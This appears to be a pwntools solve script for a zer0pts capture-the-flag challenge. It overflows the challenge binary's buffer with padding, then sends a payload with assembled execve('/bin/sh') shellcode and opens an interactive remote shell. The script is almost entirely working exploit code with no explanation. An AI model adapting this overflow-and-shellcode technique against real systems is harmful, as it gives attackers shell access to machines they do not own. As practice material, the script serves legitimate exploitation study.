#!/usr/bin/python2
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['kitty', '-e', 'sh', '-c']
exe = context.binary = ELF('./chall')

host = args.HOST or 'pwn.ctf.zer0pts.com'
port = int(args.PORT or 9011)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak *_start
b *0x4001ec
set backtrace imit 1
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
stack_depth = 0x60022e
stack_shadow = 0x600234
syscall = 0x400207

shellcode = """
xor rax, rax;
xor rcx, rcx;
mov rax, 0x3b;
xor rdx, rdx;
xor rdi, rdi;
xor rsi, rsi;
movabs  rdi, 0x0068732F6E69622F
push    rdi
mov rdi, rsp
syscall 
"""
shellcode = asm(shellcode)

rop = flat([

    "/bin/sh\x00",
    p64(0x60024b),
#    "\xe9\x46\x02\x60\x00",
    shellcode

])

padding = p64(stack_shadow + 256) * 300

io.sendlineafter("Data: ", padding)
io.sendlineafter("Data: ", rop)


io.interactive()

